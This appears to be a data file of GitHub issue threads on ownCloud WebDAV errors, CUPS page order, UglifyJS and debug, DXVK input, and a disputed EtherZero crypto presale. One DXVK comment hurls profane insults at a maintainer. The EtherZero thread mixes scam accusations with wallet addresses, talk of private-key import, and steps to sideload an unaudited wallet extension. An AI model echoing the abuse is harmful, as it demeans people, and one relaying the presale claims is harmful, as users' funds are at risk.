require_once('/datas/vol2/w4a...') #4 [internal function] __lambda_func(Array) #5 /datas/vol2/w4a134834/var/www/effingo.be/htdocs/owncloud/lib/router.php(127) call_user_func('?lambda_49', Array) #6 /datas/vol2/w4a134834/var/www/effingo.be/htdocs/owncloud/lib/base.php(606) OC_Router-&gt;match('/settings/admin') #7 /datas/vol2/w4a134834/var/www/effingo.be/htdocs/owncloud/index.php(28) OChandleRequest() #8 {main}   21.03.2013 1132 Warning PHP curl_setopt_array() [&lt;a href='function.curl-setopt-array'&gt;function.curl-setopt-array&lt;/a&gt;] CURLOPT_FOLLOWLOCATION cannot be activated when safe_mode is enabled or an open_basedir is set at /datas/vol2/w4a134834/var/www/effingo.be/htdocs/owncloud/3rdparty/Sabre/DAV/Client.php#464 full  on both install, with same server config, all was worked fine with 4.5* version. Now, sync is impossible with client due to this issue  Looks like safe_mode is enabled - please disable that ♠` Warning PHP curl_setopt_array() [function.curl-setopt-array] CURLOPT_FOLLOWLOCATION cannot be activated when safe_mode is enabled or an open_basedir is set at /datas/vol2/w4a134834/var/www/effingo.be/htdocs/owncloud/3rdparty/Sabre/DAV/Client.php#464  Second What version number is in your 3rdparty/Sabre/DAV/Version.php  The sabre version is  '1.7.5' on install 2, it is a mutualized server; i cannot disable safe_mode  generally speaking ownCloud cannot run in safe_mode  I'm sorry, i just rechecked safe_mod is off on both install  (as we can see here   &amp;  the curl warning is telling a different story ;-)  open_basedir can also be the problem  I am also having problem but for MacOSX 1.2.1 Client  is disabled for current user, safe_mode is off  I had the same error, but for me the reason was quite obscure. My webserver is a guest running on private ip address that is NAT'ed at the hosts external interface. A connection from the guest to the public one is ""refused"" so the guest is not able to curl it's own url. Quick fixed by adding a host entry to the private address in /etc/hosts. Need to investigate further why the guest can not connect to the public address (iptables).  btw The warning I had was isWebDAVWorking NO - Reason exception 'Sabre_DAV_Exception' with message '[CURL] Error while making request couldn't connect to host (error code 7)'  This at the end means your setup is not proper to allow WebDAV and sync clients to work without issues. Fix the setup -&gt; fix webdav and have fun with syncing. Generally speaking the webdav test we have incorporated will give you hints that your web server setup is not proper. We cannot solve all your setup issues and we cannot foresee all configuration combinations. The details error message is always int the logs - we try to help out as good as we can. There are cases where we most probably produce false positives - we will fix this if possible.  My situation appears similar (identical?) to what mrvanes reported. My ownCloud server is NATed with a high port mapped to 443, i.e. connecting to  port forwards to  on my LAN. If I connect to the LAN address, e.g.  I do NOT get the error message. If I connect to the WAN address, I do.  when entering administrator page it says that there is something wrong with the webdav interface and i should consider instructions manual for solving the issue. i double checked, here is everything correct - at least depending on those written in that specifiy manual. webdav also works (syncing at least works) so we may talk about false detection of owncloud. owncloud itself throws this &lt;code&gt; sWebDAVWorking NO - Reason exception 'InvalidArgumentException' with message 'The passed data is not valid XML' in /var/www/slc/htdocs/cloud/3rdparty/Sabre/DAV/Client.php531 Stack trace 0 /var/www/slc/htdocs/cloud/3rdparty/Sabre/DAV/Client.php(181) Sabre_DAV_Client-&gt;parseMultiStatus(false) 1 /var/www/slc/htdocs/cloud/lib/util.php(590) Sabre_DAV_Client-&gt;propFind('', Array) 2 /var/www/slc/htdocs/cloud/settings/admin.php(34) OC_UtilisWebDAVWorking() 3 /var/www/slc/htdocs/cloud/lib/route.php(113)  runtime-created function(1) require_once('/var/www/slc/ht...') 4 [internal function] __lambda_func(Array) 5 /var/www/slc/htdocs/cloud/lib/router.php(127) call_user_func('?lambda_908', Array) 6 /var/www/slc/htdocs/cloud/lib/base.php(606) OC_Router-&gt;match('/settings/admin') 7 /var/www/slc/htdocs/cloud/index.php(28) OChandleRequest() 8 {main} &lt;/code&gt; to avoid any silly thoughts like safe_mode on or maybe set open_basedir. both are def. OFF or unset. (safe_mode off and open_basedir isnt set). also to prevent talkings about missing php capabilities im offering for a short time phpinfo ( i understand the defending attitude of developers sometimes because nobody wants to hear something ""bad"" about his ""baby"", but i want to remind that many ppl (look into owncloud board) reported/verified that ""bug"" who have upgraded ONLY owncloud (and didnt touch php or the environment at all). so i would suggest we focus on finding the dirty lil mistake somewhere in the source. ) if you need more information related to php, backend stuff u actually using in your source or may some requirements which are not enlisted in the installation manual, gimme a notice! D best regards Simon PS just edit the ""code"" section for better reading.  I had similar problem. This is because of dynamic dns use. To solve it, simply modify your /etc/hosts file     127.0.0.1  why should a working network setup be responsible for development mistakes? and why should anyone modifying a working network setup to a wrong configured one because of ONE piece of php code? oO Thanks for the idea, but its not a solution. i prefer the devs do fix this asap among other bugs.  I think I had the same problem  webDav warning in Admin Panel unable to sync with desktop or iPhone client  I think I had the wrong php modules installed or something was missing, because this resolved the problem! the output was this  well im capable syncing, and i do meet the written requirements. no need to blindly install any modules. If you name a particular extension they may ""need"" i can check if i have it enabled or not and may add it to the configuration. blindly installing modules is unprofessional.  I know that the solution for my problem is not professional. I am not a professional. But I had luck. So I hope that someone (a developer) may extract some usefull information out of my post to get an solution for the problem.  I upgraded from 4.7 to 5.02 using the upgrade app. Prior to the upgrade my system had no issues. At this point my admin page has the following line at the top of the page Your web server is not yet properly setup to allow files synchronization because the WebDAV interface seems to be broken.    Please double check the installation guides. File synchronization is working however, and so is the Owncloud app on my Android tablet. The log messages at the bottom of the page show Error    core    storage backend \OC\Files\Storage\Dropbox not found     April 2, 2013 1934 Not sure what the Dropbox error is about since I am not using the External Storage app, it's disabled.  I also upgraded from 4.8 to 5.03. With Login https.//myserver444 I have the following warning ""Einrichtungswarnung Dein Web-Server ist noch nicht für Datei-Synchronisation bereit, weil die WebDAV-Schnittstelle vermutlich defekt ist."" Output log isWebDAVWorking NO - Reason exception 'Sabre_DAV_Exception' with message '[CURL] Error while making request couldn't connect to host (error code 7)' in /var/www/html/owncloud/3rdparty/Sabre/DAV/Client.php410 Stack trace #0 /var/www/html/owncloud/3rdparty/Sabre/DAV/Client.php(179) Sabre_DAV_Client-&gt;request('PROPFIND', '', '&lt;?xml version=""...', Array) #1 /var/www/html/owncloud/lib/util.php(590) Sabre_DAV_Client-&gt;propFind('', Array) #2 /var/www/html/owncloud/settings/admin.php(34) OC_UtilisWebDAVWorking() #3 /var/www/html/owncloud/lib/route.php(113)  runtime-created function(1) require_once('/var/www/html/o...') #4 [internal function] __lambda_func(Array) #5 /var/www/html/owncloud/lib/router.php(127) call_user_func('?lambda_789', Array) #6 /var/www/html/owncloud/lib/base.php(608) OC_Router-&gt;match('/settings/admin') #7 /var/www/html/owncloud/index.php(28) OChandleRequest() #8 {main} Clientsync and Webdav works. With Login  have no warning!  I have the same issue in OC5.0 on my local setup. I use WinXP, Nginx 1.0.12, PHP 5.4.3, MySQL 5. I 've perform some debug of this situation and I found that Sabre DAV Server wait for Authentification header from Sabre DAV Client then it try to connect to server in function isWebDAVWorking() from lib/util.php. But I didn't found any place there Authorization header was sent. I didn't seen the setup warning like in first message, I just seen 504 error instead of it. The $_SERVER['HTTP_AUTHORIZATION'] variable is empty.  Could somebody explain how should work Sabre DAV Server in this case?  Hello I had all the errors above too. I finally got it to work, so the welcome screen to download the app appears without giving an error. How to fix the problem sWebDAVWorking NO - Reason exception 'InvalidArgumentException' with message 'The passed data is not valid XML' in /var/www/slc/htdocs/cloud/3rdparty/Sabre/DAV/Client.php531 Open the file /var/www/owncloud/remote.php got to the last line and change require_once to require Also i add in the /etc/hosts my used dynamic domain to the localhost 127.0.0.1. I added the entry to the host file because my router has a ""nice feature"" it routes all internal requests to my public dynamic ip to the router..... Maybe this helps.  I am still have no idea what things makes this WebDAV failed after all of necessary actions is taken  disable all other DAV server like in cPanel disable webdisk webdav mod rewrite on open_basedir are disabled from both apache and php safe_mode is off disable firewall for test  note for a2enmod in owncloud documentation should be marked as 'debian or ubuntu' command.  I only get the message, when i am using https to connect to my owncloud instance ... i would like to use https, but it seems not to work correctly (  @friend please send a pull request to the documentation repo, its really easy to do ;)  The same problem here. And I have this in my warning log file isWebDAVWorking NO - Reason exception 'Sabre_DAV_Exception' with message '[CURL] Error while making request couldn't connect to host (error code 7)' in /var/www/html/cloud/3rdparty/Sabre/DAV/Client.php410 Stack trace #0 /var/www/html/cloud/3rdparty/Sabre/DAV/Client.php(179) Sabre_DAV_Client-&gt;request('PROPFIND', '', '&lt;?xml version=""...', Array) #1 /var/www/html/cloud/lib/util.php(590) Sabre_DAV_Client-&gt;propFind('', Array) #2 /var/www/html/cloud/settings/admin.php(34) OC_UtilisWebDAVWorking() #3 /var/www/html/cloud/lib/route.php(113)  runtime-created function(1) require_once('/var/www/html/c...') #4 [internal function] __lambda_func(Array) #5 /var/www/html/cloud/lib/router.php(127) call_user_func('?lambda_8', Array) #6 /var/www/html/cloud/lib/base.php(608) OC_Router-&gt;match('/settings/admin') #7 /var/www/html/cloud/index.php(28) OChandleRequest() #8 {main}  @friend your problem is that your webserver can't connect to itself  Same problem too. My warning log file says  isWebDAVWorking NO - Reason exception 'Sabre_DAV_Exception' with message '[CURL] Error while making request Failed connect to host; Connection timed out (error code 7)' in /var/www/localhost/htdocs/owncloud/3rdparty/Sabre/DAV/Client.php410 Stack trace #0 /var/www/localhost/htdocs/owncloud/3rdparty/Sabre/DAV/Client.php(179) Sabre_DAV_Client-&gt;request('PROPFIND', '', '&lt;?xml version=""...', Array) #1 /var/www/localhost/htdocs/owncloud/lib/util.php(590) Sabre_DAV_Client-&gt;propFind('', Array) #2 /var/www/localhost/htdocs/owncloud/settings/admin.php(34) OC_UtilisWebDAVWorking() #3 /var/www/localhost/htdocs/owncloud/lib/route.php(113)  runtime-created function(1) require_once('/var/www/localh...') #4 [internal function] __lambda_func(Array) #5 /var/www/localhost/htdocs/owncloud/lib/router.php(127) call_user_func('?lambda_256', Array) #6 /var/www/localhost/htdocs/owncloud/lib/base.php(608) OC_Router-&gt;match('/settings/admin') #7 /var/www/localhost/htdocs/owncloud/index.php(28) OChandleRequest() #8 {main} OS  Linux Gentoo webserver  lighttpd  I had the same situation as mrvanes and steveAliff.  My ownCloud server is NATed with a high port mapped to 443, i.e. connecting to  port forwards to  on my LAN. Add a line to /etc/hosts 127.0.0.1 myserver.realdomain and execute the iptables command &lt;code&gt; \# iptables -t nat -A OUTPUT -p tcp --dport 8888 -j DNAT --to 127.0.0.1443 &lt;/code&gt;  Hello everyone, who is getting this issue. I've realized, that the strange warning message appears if I use the domain name instead of the IP address (I don't use any forwarding).  to if I change the address as follows  message disappears. So I hope the information will help.  I added 'overwritehost' =&gt; '192.168.1.1' into config/config.php $CONFIG array and the message disapeard. Be sure to check if you're behind a NAT like me and whats your internal server address. Here's where I got the tip  I’m closing this issue because it has been inactive for a few months. This probably means that the issue is not reproducible or it has been fixed in a newer version. Please reopen if you still encounter this issue with the latest stable version (currently ownCloud 5.0.9) and then please use the issue template. You an also contribute directly by providing a patch – see the developer manual. ) Thank you!  I am using 5.0.10 and the issue is still present. But in my case, I was able to resolve it by fixing my firewall, which runs on the same machine as the server. I already posted the finding somewhere else but essentially, the server is doing an access to itself using its external IP address (i.e. not 127.0.0.1) . If the situation is not allowed by iptables, then the server will time out and eventually serve the page to the browser albeit after a long time......  So what’s the plan of action here?  I came across this too while doing a test-drive install in a VM. The problem was of course with my VM setup. (I used faux vhost name in Apache to mount ownCloud, but forgot to add a corresponding entry in the VM's /etc/hosts, i only had the entry in my bare metal machine's /etc/hosts.) Could you guys add the URL of your test request to the message? If it was present, i'd immediately realize what's going on. Currently it's not visible what kind of check you perform, so it's not obvious how to debug the problem. E.g. Your web server is not yet properly setup to allow files synchronization because the WebDAV interface seems to be broken -- request to "" failed. Please double check the installation guides.  @friend Actually the url that we test shoudn't be important. If you would ""fix"" to this url that you would hide the warning but ownCloud wouldn't work correctly in general because a lot of other services on the internet are still not working. This is the whole point of this warning.  I still think that this warning shoud be shown if full internet access ist not working. This is a feature and not a bug.  @friend So this warning helped you to fix a bug in your firewall. I still think that this warning is a useful feature and not a bug.  @friend Yeah absolutely, the warning helped me fix a configuration issue with my VM. It's very useful. My point was that if that warning conained a bit more info, i'd realize what's the problem a bit sooner. Just sayin' )  I had the same error messages as OP, turns out ownCloud does some requests with empty user agent (bad habit?) and my modsec rules didn't like that so they got blocked. Running pretty much standard OWASP rules. Just adjust them or comment them and error message is gone.  Hi, I'm not sure this should be closed.  The only way I could get the message to disappear on Windows server was to ensure 127.0.0.1 pointed to the website OwnCloud was running on.  That is, in IIS select the site you have OC installed on, open the bindings, Add a new binding with the following values Type http IP Address All assigned Port 80 Host name  (Host name blank) The problem with this approach is it requires the owncloud site to be set to 127.0.0.1. If you run a local  web app on 127.0.0.1, it is no longer available on the same machine as OC. Is it possible to ensure the webdav check using the OC sitename? ",41,6,1632,0,0,897,23,
owncloud/core/2862,0.070826715,owncloud,core,The OS X menubar client is spamming my apache/owncloud log file with PROPFIND requests,1324,22,23,0,0,"What's worse is I don't seem to be able to ignore/use Apache's dontlog syntax to resolve it. grep -c PROPF /var/log/httpd/httpd-access.log     2802  That's about 1/4 of the logged requests. PROPFIND and GET requests account for about 4200 requests. This syntax works for other URI requests     SetEnvIfNoCase Request_URI ""^PROPFIND"" dontlog  but not for those. Requests from the desktop/browser are cheerfully ignored but not from the mini-client. I thought it might be something in Apache that sets authenticated requests aside and always logs them but the desktop/browser test disproved that. I find I can't even filter by IP address they still get logged. I haven't had an opportunity to capture and examine packets to see what's ado. It's a low priority issue as I can't use owncloud properly (i.e., with encryption) due to my ISP's peculiar attitudes about security. But perhaps an annoyance that needs sorting.  I’m closing this issue because it has been inactive for a few months. This probably means that the issue is not reproducible or it has been fixed in a newer version. Please reopen if you still encounter this issue with the latest stable version (currently ownCloud 5.0.9) and then please use the issue template. You an also contribute directly by providing a patch – see the developer manual. ) Thank you! ",3,0,51,0,0,61,1,
owncloud/core/2932,0.0473913925,owncloud,core,Basename couses problems on embedded systems (OpenWRT),1679,10,23,0,0,"I have successfully installed OwnCloud 5.0.4 on WRT1043ND router running OpenWrt Attitude Adjustment 12.09-rc2 image. The only grave issue I had was inability to save and sync filenames with international characters. The problem stems to standard php basename() implementation which only works if setlocale can be set correctly to en_US.UTF-8. Unfortunately, many embedded systems, including OpenWRT and ddwrt, do not have locale support at all. Files and folders are created successfully on disk, but oc_filecache has [name] field populated incorrectly for example folder with full path ""/clientsync/яшерąčęéíñ"" is set with name ""clientsync"", a filename with full path ""/clientsync/яшерąčęéíñ.txt"" will become just "".txt"". As a result, Files web UI points to non existing path, and Sabre WebDAV has same issue propagated from /lib/connector/sabre/node.php, since file full path is reconstructed as folder name . ""/"" . [name]. After I have replaced the references to basename() function to my custom basename_safe() one in /lib/base.php, OwnCloud has started working without a hitch function basename_safe($path, $suffix=null) {     $path = rtrim($path,'/');     $path = explode('/',$path);     return end($path); } By the way, Sabre made a design choice not to use standard basename(), it has it's own solution for basename() Sabre_DAV_URLUtil-&gt;splitPath(). Is it possible to have a configuration variable, which would switch to alternative basename() implementation for the purpose of running OwnCloud on embedded systems?  locale support is essential and systems without it are not supported. Sorry we cant support all devices, but you can always send us a pull request ;) ",4,0,117,0,0,54,1,
apple/cups/5315,0.106428805,apple,cups,fix or document proper configuration for specifying default output order,5940,62,74,0.6666666666666666,0,"I have an HP Photosmart Plus B210a which prints pages face up. I am trying to figure out how to configure Cups to print documents so that I don't have to reverse them by hand when they come out of the printer. I found a discussion on linuxquestions.org which summarizes a recommended fix  Add the line  *DefaultOutputOrder ""reverse""  to the file  /etc/cups/ppd/PrinterName.ppd  I have tried this with varying results. I printed twelve two-page documents to try to investigate what is happening. I tried printing via the  command, via Evince and via Okular. I tried using a ppd file with and without the  line, and I also tried specifying a default output order with  of ""reverse"" or ""normal"" lpoptions -dHP_Photosmart_Plus_B210a -o outputorder=reverse ... lpoptions -dHP_Photosmart_Plus_B210a -o outputorder=normal  The results   Ignores ppd line, honors lpoptions setting Evince Ignores lpoptions setting, honors ppd Okular Ignores both lpoptions and ppd  As with the reporter of #1679, I would have expected the PPD which is downloaded by default for my printer to give the ""correct"" behavior by default, which is to say, not requiring me to manually reverse long documents when they come out of the printer. I also tried the solution of #1679, using lpadmin -p printer -o outputorder-default=reverse lpadmin -p printer -o outputorder-default=normal  This setting was honored by Evince but not by  or Okular. Okular's print dialog allows the user to change the ouput ordering, but Evince's print dialog, which appears more ""standard"" to me, says ""Page Ordering Not available"". There was some mention of all documents going through  as a final filter. If this is true then it should be possible for Cups to give users a single point at which to configure output ordering, which works uniformly across all applications which might submit print jobs to Cups. In either case it should be documented what is the preferred way to deal with face-up printers. I humbly offer my suggestion that for ""outputorder=reverse"" to work intuitively as a per-job option, then it should interact with the per-printer option as a parity bit, e.g. reverse+reverse=normal, rather than as an ""override"" (reverse+reverse=reverse). In my experimentation it seems to be the latter, and I think this should be documented because it is somewhat different from the way that other options like ""page-ranges"" work. If I write a script to print the odd pages in order and then the even pages in reverse, I feel I should be able to get the same result (manual duplex) regardless of the printer model. In any case where the  man page says   -o outputorder=reverse       Prints pages in reverse order.  I think it maybe should say something like   -o outputorder=(reverse|normal)       Overrides printer output-order setting for this job. With       ""outputorder=reverse"", document will be reversed on       face-down printers, and correctly ordered on face-up       printers; and vice-versa for ""outputorder=normal"".  Here is my PPD file in case it helps HP_Photosmart_Plus_B210a.ppd  OK, so I'm assuming from the list of applications you are using that you are using a Linux distribution of some sort. The PPD comes from the HPLIP project. Unfortunately, this isn't something we can help you with - either the cups-filters raster filter is not honoring the DefaultOutputOrder value in the PPD or the HPLIP driver isn't doing something right. Either way you need to start with your Linux distribution's bug reporter and go from there...  Michael, I can submit the bug elsewhere but do you really mean to suggest that I need to know about HPLIP and cups-filters to understand why three different tools process the options I've set (using your software) in three different ways? What about the other questions I asked? You don't think any of your documentation needs to be fixed? Can you point me to the place in the documentation where you say which of lpadmin/lpoptions/PPD solutions is expected to make the printer work correctly with all CUPS clients? Who takes responsibility when other projects don't know how to interface correctly with your software? Can you give the HP people a hint on how the HP filter would need to be modified so that it respects the  setting not just with Evince print jobs but also with jobs submitted by Okular and ? Or how can Okular be modified so that it prints correctly on inkjets? Is there another brand of inkjet printers, which works correctly with CUPS? What about cups-pdf, I've noticed that when printing to the virtual PDF printer then  doesn't respect the lpadmin setting, Evince doesn't respect the lpoptions setting, and Okular doesn't respect either. Is that still an HP problem? Are you ever grateful to receive bug reports about your project?  @friend The non-CUPS software is not following the standard interfaces that CUPS provides. IOW, this is either a bug in HPLIP or cups-filters. If they follow the standard interfaces you won't have to do a damned thing to have things Just Work™. We can't fix software that isn't ours... As for pstops, no not all jobs get routed through there. Maybe 18 years ago that was the case, but not today. As for the documentation, it is correct if the underlying driver or filters follow the standard interfaces.  So cups-pdf is HP's problem too? Is there any Linux software you can name that interfaces with CUPS correctly? It would help to have an answer to this question, relating to the configuration of face-up printers ""Can you point me to the place in the documentation where you say which of lpadmin/lpoptions/PPD solutions is expected to make the printer work correctly with all CUPS clients?""  cups-pdf is from another developer. Both depend on cups-filters on Linux, which probably means that the problem lies with cups-filters. We do not document printing solutions for Linux, working or otherwise. We don't write or support the software, and we don't make the distributions. ",19,0,212,0.3333333333333333,0,199,13,
visionmedia/debug/547,0.121477028,visionmedia,debug,"Using Uglify-JS debug prints wrong logs (with ""color: #XXXXX"" string)",3740,48,36,0.6,0,"I use ES6 plus Babel plus optional uglify-js. Debug example to show the problem When I do NOT use , everything is ok and the output is However, when using ""color #CC9933""%s` argument.  I'm trying to make a tiny project that shows the problem.  After hours trying to reproduce the issue in a fresh project, I've realized that the issue was due to the fucxxxx . Deleting it and  and calling  again fixed the issue. NPM is becoming really a pain nowadays... Sorry for the noise.  what's your uglifyjs config? I have same issue here. I set collapse_vars to false to avoid this issue before, but it's not working now.  No one, I just use . The issue, in my case, disappeared after a proper  and some complains to NPM stuff (which is a pain today).  Hi there, I've got the same issue over here (though minification happens via tinyify (which uses uglifyjs) in a Babelify-transformed Browserify project. I've tried re-installing the node_modules as suggested by @friend but didn't get anywhere. I don't have a  in this project. @friend  did you find a solution for this?  Thanks for the answer, sorry for the delay. I was using Browserify when I asked my question with uglifiify running uglify-js and could not find a way of directly passing options like  to it. Maybe that's where things got confused – I've since switched to Webpack with  and don't have this issue anymore.  I'm seeing the problem in uglifyjs-webpack-plugin, I've set the webpack.config to include and its still giving the weird ""color"" output reported by @friend  It would be good if this was documented, its an obscure hack to work around this issue with debug, and its unlikely people will find it in this closed issue. Even more obscure if you don't explicitly use Uglify, just the default webpack.  I had to add the following to get it to work.  When using tools like angular-cli,  isn't easily changed. It would be great if debug was able to work properly under default production webpack settings.  It would be even greater if libraries worked fine without depending on specific settings in other libraries. I think that's better than ""make it work for my use case, plz"".  This issue is not really closed ... could be great to re-opened it  We're not doing anything crazy, here. We're not pushing Javascript to its limits, we're not expecting any weird or new syntax to work (at least, not until v4 when we switched to ES6). If UglifyJS is messing up code, that's its own fault. Please open a ticket there. It is not the job of a library like this to conform to random tools such as UglifyJS. They are supposed to accommodate the libraries upon which they operate, not the other way around. There is nothing actionable on 's end to fix anything, because there is nothing wrong here. UglifyJS should not be changing functional semantics, so if it does so in a breaking way, take it to the maintainer of UglifyJS. Or you can use something more modern and active, such as Babel or Terser.  AFAIR I've no longer seen this issue by using Terser. 100% agreed with @friend.  We just tell that the printf syntax is unusable in minified version in browser, with a product out of the box and widely used like webpack (18.5M download) / uglify (35.1M). The answer of Uglify, we will know it, there is an option for that. Someone tell that it will cost 5% of js size. Every byte so heavily win is important. I will not make a migration of the minifier for ""only"" a logger problem. I will make the calls without printf syntax. it will be ugly, but in less 10 minutes it will be done. thank you for your no help.  This isn't a logger problem. UglifyJS is breaking your code. That should be setting off alarms and red flags for you. You're welcome. Please take your attitude elsewhere. ",15,4,149,0.2,0,101,2,
doitsujin/dxvk/492,0.629190505,doitsujin,dxvk,Farcry 5 Steering Bugs ,683,8,5,0.5,0,"So in Farcry 5 a small issue regarding car steering has come up i can't turn left or right even when remapping the controls Software information Farcry 5 Mazed out System information  GPU R9 290X Drivermesa 18.1.3 Wine version 3.10 e-sync DXVK version 0.61    Input issue -&gt; not a DXVK bug.  Any idea on how to fix the input issue ? I have xinput installed anything else would be big help Sent from my iPhone  This is not the place to ask that question, as it has nothing to do with DXVK.  Getting real tired of lazy Linux assholes whatever dude you want to be a fuck face that’s not willing to help people so be it Sent from my iPhone  Not going to bother with personal insults. ",2,14,14,0.5,0,36,1,
MetaMask/eth-phishing-detect/653,0.436123455,MetaMask,eth-phishing-detect,EtherZero.org is incorrectly flagged,12940,97,69,0.5,18,"Dear Meta Mask team, We found MetaMask have blocked access to our website EtherZero.org, we are making a ethereum fork and presell some coin to our early investors.  We also found some dangerous with the method to import private key into our website wallet or Meta Mask fork plugin to get EtherZero, so we will recommend users add a custom node to MEW or Meta Mask to get ETZ later. I don't know why Meta Mask block our site, it's unfair and please you can re-check it again, Thank you!  MetaMask works find on the wallet when you search (EtherZero Wallet), same goes for KeepKey and Ledger Nano. Importing private key should only be done on websites which are secured (such as  or  . Also, please correct the sending address to buy ETZ, because first it was 0xe4ba55b67b5596eaac5000b724dff7e86ad83196, then it was 0xf33068d5e798f6519349ce32669d1ec940db1193 and now it is 0x7E416ACB49c0B0d928BAda074Bf6597D80740bC2. And only the last one (0x7E416ACB49c0B0d928BAda074Bf6597D80740bC2) is mentioned in the tweets, telegram messages, websites and blogs. Please correct this.    is not our website, don't go to there! And don't send ETH to anyone address. Our pre-sale have been paused!  But ethzero.org is marked for fake and the address was removed to send ETH so that's suspicious. And no Ledger Nano support on ethzero but there is on ethzero-wallet.org ??   is our official website, don't go to others or your ETH will be stolen!  But every analytic urlscan says etherzero.org is fake??  Don't reply to my post, you can steal some ETH but just it.  Lol, no code repository, no opensource, no whitepaper and now even taken down for illegal use of MetaMask. Give me a break. Changing ETH receive address 3 times and even sending it to your own wallets back and forth. The fork is real and claiming ETZ is real, but this is just childish.  Hi Admin, Please have a look at our official telegram  and check it out what we are doing. Thanks!  @friend I am the one who issued the blacklist.  You mention it's going to be a 11 ETZ/ETH fork in your bitcointalk post, but during sale I can buy 3300ETZ for 1 ETH - this doesn't add up. Everyone is sending funds to 1 address to buy these ETZ tokens which doesn't make sense in terms of a sale - how will you track and issue tokens to who contributed what with the correct amount? There was no whitepaper (at time of blacklist) You're asking people to import their private keys into 3rd party software that isn't auditable/released and say it's the only way to get your ETZ tokens. You say your team is 20 people with cooperative tasking with top dapp shops in India and Eastern Europe yet all your repos have 1 contributor from the ETZ team (which is an anonymous contributor) and that's just changing existing ETH/MetaMask/MEW branding to ETZ. Your fork was cancelled and 5 days later open up again with zero explanation.    Hi,  It's a 11 fork but we also pre-mine 97M, and 20M will be sold to early investors amd 77M will be reserved for reservation, i don't think it's illegal. We have released everything on the get ETZ page  before investors send ETH to us.   And we have refunded all the requests investors asked. You can check our address  and  ask investor send ETH to us from a compatible wallet and we collect the sending address from etherscan.io, so we can send ETZ to their addresses later.  WP have been uploaded  have found some dangerous with the method to import private key into our website wallet or Meta Mask fork plugin to get EtherZero, so we will provide users a custom node to be added to MEW or Meta Mask to get ETZ, or you can add your notes. You can find the info have been updated at  are 20 people team, 9 core team members in China, one team located in India, one in eastern Europe to help us. It's a hard fork project, so we forked other codes including Meta Mask, but we also would like to use Meta Mask  if it's compatible. We only use it as a test wallet.   PS 0 TX fee have been implemented on our test wallet ETZ's test wallet has been running on the test network and can download from here  tutorial   unzip wallet  open chrome//extensions/ in Chrome browser  drag the unzip folder to the extension interface  this is a Meta Mask version of the fork version of the wallet, the same as Meta Mask  in the telegram group you can add the administrator in private, we can send some ETZ test currency to you (only can be tested on the test net, later we will clear it).  We have explained it on our telegram before(at the first we want to hard fork ethereum, but then want to make a ICO instead as a private investor encouraged us made a ICO, but this way didn't work so we restarted the HF). It's 6180 members group, we didn't cheat anyone or their ETH, if you can proof it we won't said anything about the incorrectly flagged.   EtherZero has all the dream features needed by DAPP developers 0 TX fee, instant payments and high scalability(up to thousands of TPS). Made by Dapp developers, for Dapp developers. I thought we are doing a new ways for DAPP development, many developers will need these features. It's critical to our project as many users used Meta Mask, and we also recommended they to use Meta Mask and MEW for helding ETH to get ETZ for free for many times. If you need anything we would like to provide to you asap. Thank you very much!  Sorry ETZ -- but you've lied to every investor. Your announcement articles that lead to people investing were stating only a modest 20M premine. You've since changed this completely. You are scammers. Note You edited your announcement post on  edited your advertisements TODAY and hid evidence of this fraud. Your own employees are contacting the press and warning people not to invest. You have no way of explaining what you have done to investors. All you can do is hide the evidence and tell stories. Your whole business is based on a lie in your marketing material (that you routinely change, just like the ETH addresses you have your victims send ETH to) claiming you can handle thousands of transactions per second, zero transaction fees, and somehow survive DDOS attacks. Where is the code?  Thanks @friend for this investigation. It can't be more clear this is a huge scam.  Guys,  I think that you are all over-reacting.   I believe that the project has potential and has gained community support.  Hi, Do your research more and you will find the true. We changed the plan just want to protect our early investors, they all get 10X ETZ at the same ETH sent. Do your research more and you will find the true. No one want a refund and if they ask, we just send back their ETH. They are not our employees ever! They want to work for us, but we rejected them. So bad things happenned. We didn't want to hide anything, just bc the code is not ready, it will be open soure soon. True is true and time will tell. Be a wiser man please! ---- On Mon, 15 Jan 2018 124034 -0600 etherenvoy &lt;notifications@friend.com&gt; wrote ---- Sorry ETZ -- but you've lied to every investor. Your announcement articles that lead to people investing were stating only a modest 20M premine. You've since changed this completely. You are scammers. Note You edited your announcement post on  edited your advertisements TODAY and hid evidence of this fraud. Your own employees are contacting the press and warning people not to invest. You have no way of explaining what you have done to investors. All you can do is hide the evidence and tell stories. Your whole business is based on a lie in your marketing material (that you routinely change, just like the ETH addresses you have your victims send ETH to) claiming you can handle thousands of transactions per second, zero transaction fees, and somehow survive DDOS attacks. Where is the code? — You are receiving this because you were mentioned. Reply to this email directly, view it on GitHub, or mute the thread.  We changed the plan just want to protect our early investors, they all get 10X ETZ at the same ETH sent. Anyone want a refund and if they have asked, we just send back their ETH.  They are not our employees ever! They want to work for us, but we rejected them. So bad things happened. We didn't want to hide anything, just bc the code is not ready before the fork, it will be open source soon. And please read this article and you will find more interesting things  Where is the code that allows for 10,000 tx/s and unlimited scalability on the Ethereum network?Vitalik has been wasting his time working on sharding -- I'm sure he'd like to see it. Where is it? Open the repository. Let people see. Why would you take investment with an advertisement of 116M total, and then, 3 days before launch, change it to 197 M total -- giving yourselves control of the entire market people invested in thinking it was a modest, decentralized fork? There is no why -- you lied to bitcointalk.org, lied to the media, lied to investors, lied to employees doing sales for you. ETZ, if it ever exists, will be worth very little after you centralize it and give yourselves total market control without warning the people who were investing for weeks. Are you still launching on the 19th -- 3 days from now?  You must have not check our website and WP. The 10K TPS is the next phase of ETZ. Marketing plan always need to be changed to fit the resources we had. We have increased the total number of ETZ from 116M to 194M, but also provide 16.5 times of ETZ to our early investors. The price of ETZ is 10% of previous price. And we also issued refunds if anyone asked. We didn't have employees doing sales for us, just one man called David asked to work for us.  He also asked money to members from EtherZero telegram group and want to scam ppl for selling ETZ he didn't have. He is banned from the group. lol We have implemened 0 TX fee on our test wallet and testnet and the HF will be happened on 19th, Jan.  你需要理解一下。我没有讹诈你 。这不是勒索。 你对国外的投资者撒谎，人们生气。 这与我真的无关。我们谈实话可不可以？ When you started taking investment from westerners (1) You do not have the code done (2) You did not have a white paper (3) You were claiming 116M total ETH， after investment 197M. The market will be very different. 你开始拿到外国人的投资的时候 一 变成没做好，也没github 二 没有完成的WP 三 原来是116M，拿到投资以后你高速人是197M。市场，投资会超级不同的。   As a chinese, I think you shouldn't be a translator as your chinese is really funny.   won't change anything on our article about you E E. Let me ask your questions  We had provide test wallet running on testnet before the presale - you didn't tell the truth  We have told our early investors WP will be updated soon, and they trusted us, and we also delivered our promise, the WP can be downloaded here  plan always need to be changed to fit the resources we had. We have increased the total number of ETZ from 116M to 194M, but also provide 16.5 times of ETZ to our early investors. The price of ETZ is 10% of previous price. And we also issued refunds if anyone 